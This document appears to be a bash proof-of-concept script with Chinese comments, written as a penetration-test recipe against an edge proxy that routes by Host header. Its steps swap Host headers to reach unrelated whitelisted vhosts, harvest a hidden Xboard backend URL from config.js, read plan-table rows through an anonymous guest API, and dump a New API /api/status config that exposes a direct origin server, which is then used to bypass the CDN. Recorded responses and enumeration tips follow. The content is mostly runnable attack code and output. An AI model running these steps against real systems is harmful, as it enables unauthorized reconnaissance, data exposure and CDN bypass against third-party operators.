#!/usr/bin/env bash
# 边缘 Host 白名单里的第三方 vhost 未做隔离：
#   A) 第三方站前端配置明文暴露真后端（Xboard staticBaseUrl）
#   B) 该后端 Xboard guest 接口匿名读出 plans 表行（库表数据面）
#   C) 同白名单另一家 New API /api/status 匿名全量配置泄露 + 暴露直连源站
#
# 前置
#  - 目标在一个"按 Host 头回源"的边缘（本例 Photon-Edge）后面，且该边缘的 Host
#    白名单里混入了与主业务无关的第三方站点域名（本靶标是同一运营方的一批落地页）。
#  - URL 与 SNI 固定为真实站点域名，只有 Host 头换；本机必须 --noproxy '*'，
#    否则本地 HTTP 代理会二次按 Host 分流，结论不可信。
#  - 全程只读 GET，<=2 req/s，每条都留一条正常 Host 的对照。
#
# 用法：改下面三个变量后 bash poc.sh
#   EDGE  = 已确认的边缘 IP（多台任选一台；先用 Host:127.0.0.1 /nginx_status 之类的
#           稳定信道确认该边缘确实按 Host 回源）
#   SNI   = 真实站点域名（TLS 校验与边缘分流都靠它）
#   SITE  = 主站 URL 主机名

EDGE="192.0.2.6"
SNI="target485.example.com"
CURL="curl -sS -k --noproxy * --resolve ${SNI}:443:${EDGE} --max-time 20"
# Xboard 后端与第三方站不在同一 Host 上，直接按域名打（它自己走 cloudflare）

echo "=== [0] 对照：Host 保持真实域名，取主站首页指纹（后续判别是否落到别站用）==="
$CURL -o main.html -D - "https://${SNI}/" | head -6
# 期望：200 + text/html + 主站 SPA（本例 798B，title 与第三方站完全不同）
HASH_MAIN=$(sha256sum main.html 2>/dev/null | cut -c1-16)
echo "main.hash=$HASH_MAIN"

echo
echo "=== [1] 枚举白名单 Host：随便试第三方域名，看是否落到别的站点 ==="
# 来源：运营方同关联域名 / 证书 SAN / 主站页脚友链 / 同 IP 反查 / 已泄露配置里的兄弟域名。
# 判据：返回 200 且正文与主站不同 hash、title 不同 → 该 Host 在边缘可回源，是独立 vhost。
for h in target490.example.com target491.example.com; do
  echo "--- Host: $h GET /"
  $CURL -H "Host: $h" -o "probe_$h.html" -D - "https://${SNI}/" | head -8
  echo "hash=$(sha256sum probe_$h.html 2>/dev/null | cut -c1-16)"
done
# 本例实测：
#   target490.example.com     → 200 / 3452B / Last-Modified 2026-07-31（Xboard 落地页，与主站 hash 不同）
#   target491.example.com  → 200 / 1713B / New Router SPA（title=New Router，X-New-Api-Version: 2.0.4）
# 反过来主站 target485.example.com 也回 200 798B，说明是白名单里并列多个 vhost，不是通配。

echo
echo "=== [2] A：第三方站前端配置明文暴露真后端（静态泄露）==="
$CURL -H "Host: target490.example.com" "https://${SNI}/config.js" -o jdy_config.js -D -
grep -n -A3 'staticBaseUrl' jdy_config.js
# 期望：200 / application/javascript / 约 21KB，正文含
#   urlMode: 'static',
#   staticBaseUrl: ['https://target492.example.com/api/v1'],
# —— 该域名完全没出现在主站，是只从这条配置才能拿到的后端。

echo
echo "=== [3] B：直打暴露出来的 Xboard 后端，guest 接口匿名读 plans 表（核心）==="
curl -sS --noproxy '*' --max-time 20 -D - \
  "https://target492.example.com/api/v1/guest/plan/fetch" -o plans.json | head -8
python - <<'PY'
import json
j=json.load(open('plans.json',encoding='utf-8'))
d=j.get('data') or []
print('status=%s rows=%d' % (j.get('status'), len(d)))
if d:
    print('columns:', ','.join(d[0].keys()))
    for r in d: print(r.get('id'), r.get('name'), 'month_price=',r.get('month_price'), 'transfer_enable=',r.get('transfer_enable'))
PY
# 期望：200 / application/json / 约 9KB，status=success，7 行；
#       每行是全字段 DB 记录（id, group_id, name, content, month_price, quarter_price,
#       half_year_price, year_price, two_year_price, three_year_price, reset_price,
#       transfer_enable, speed_limit, device_limit, show, sell, renew, sort, created_at, updated_at）
# 旁证（同一后端、同为 guest 面）：
#   /api/v1/guest/comm/config → 200，含注册开关、邮箱后缀白名单、验证码开关
# 注意：guest/plan/fetch 是 Xboard 设计上的公开计价接口；价值在于它直接吐库表行
#       （含自增 id 与 created_at），且后端地址只能从 [2] 的 config.js 拿到。

echo
echo "=== [4] C：同白名单另一家 New API 的 /api/status 匿名全量配置（含直连源站）==="
$CURL -H "Host: target491.example.com" "https://${SNI}/api/status" -o status.json -D -
python - <<'PY'
import json
j=json.load(open('status.json',encoding='utf-8'))
d=j.get('data',{})
print('top-level keys:', len(d))
for k in ('self_use_mode_enabled','api_info_enabled','SidebarModulesAdmin','HeaderNavModules'):
    print(k, '=>', json.dumps(d.get(k), ensure_ascii=False)[:400])
PY
# 期望：200 / application/json / 约 3.5KB；响应头 X-New-Api-Version: 2.0.4
#       data.api_info[] 列出全部线路，其中一条
#         {"route":"直连","url":"http://target489.example.com:8000"}
#       暴露了 CDN 之外的裸源站；data.self_use_mode_enabled=true；admin 侧模块全 enabled。
# 已证否：/api/settings → 404（107B JSON）；/api/pricing → 401（142B）——只有 /api/status 匿名。
#         该站 /.env、/.git/config、/config.yaml 都返回 200，但其实是 SPA 回退页（1713B，
#         与 / 同 hash 972824088fb7243b），不是真配置文件。

echo
echo "=== [5] 顺藤：直连源站，确认是同一 New API 实例（绕开 CDN 作后续打点入口）==="
curl -sS --noproxy '*' --max-time 20 -D - "http://target489.example.com:8000/" -o origin.html | head -8
# 期望：200 / text/html / 1713B，与 [4] 的 SPA 回退同 hash → 同一实例，且 8000 端口对公网开放。

echo
echo "=== 判据汇总（三条同时成立才算这条成立）==="
# 1) 换第三方 Host 的 GET / 返回 200 且与主站 hash 不同（vhost 可回源，白名单确实并列多站）；
# 2) target490.example.com/config.js 后能打出 target492.example.com/api/v1/guest/plan/fetch 并拿到 status=success + 行数据；
# 3) target491.example.com/api/status 带 X-New-Api-Version 且 api_info 里出现非 CDN 的直连地址，且该地址可直连复现同 hash。
#
# === 失败常见原因 ===
# - 边缘只按 SNI 分流不看 Host：换 Host 后与主站响应一模一样（hash 相同）→ 整体不成立，别硬套。
# - 本机走了 HTTP 代理：代理自己按 Host 改连 → 必须 --noproxy '*'；h2 场景要改 :authority。
# - 打错层：/api/v1/guest/... 只在后端域（target492.example.com）有；打在前端 Host 上是 404 548B。
# - 该后端被关了 guest 面或加了 WAF：plan/fetch 变 404/403 或返回 HTML 验证页。
# - New API 版本不同：/api/status 字段可能不含 api_info（老版本），但 X-New-Api-Version 头仍可作指纹。
#
# === 边界 ===
# - plans 是公开计价数据（低危），不是用户表；要拿 users/tokens 需要 Xboard 的
#   guest 面之外再找（该靶标 guest/comm/config 只给注册配置）。
# - target493.example.com / www.landian.news / target494.example.com 等也在这套白名单里，本次仅 404/SPA 回退，
#   但枚举思路一致：换 Host 看 hash，只对"200 且 hash 不同"的站继续投入。
exit 0

## 实测原始回显（task#612，2026-11-03）
# [2] 200 21342B，片段：
#   urlMode: 'static',
#   staticBaseUrl: [
#     'https://target492.example.com/api/v1',
#   ],
# [3] 200 9244B，status=success，7 行，首行：
#   {"id":8,"group_id":1,"name":"☁️Vip1-60G包月","tags":[],"content":"✅...","month_price":1600,
#    "quarter_price":4500,"half_year_price":8600,"year_price":16300,"transfer_enable":60,
#    "speed_limit":...,"device_limit":5,"show":1,"sort":...,"created_at":1777038965,...}
#   列集合 24 个字段 = 直接映射 plans 表的列，非视图裁剪。
# [4] 200 3532B，头 X-New-Api-Version: 2.0.4 / X-New-Router-Version: 2.0.4，摘录：
#   "api_info":[{"route":"Sharon","url":"https://target491.example.com"},
#               {"route":"CloudFlare","url":"https://target495.example.com"},
#               {"route":"Nginx","url":"https://target496.example.com"},
#               {"route":"直连","url":"http://target489.example.com:8000"},
#               {"route":"EdgeOne","url":"https://target497.example.com"}],
#   "self_use_mode_enabled":true
# [5] 200 1713B，sha256 前缀 972824088fb7243b == target491.example.com 的 SPA 回退 hash。
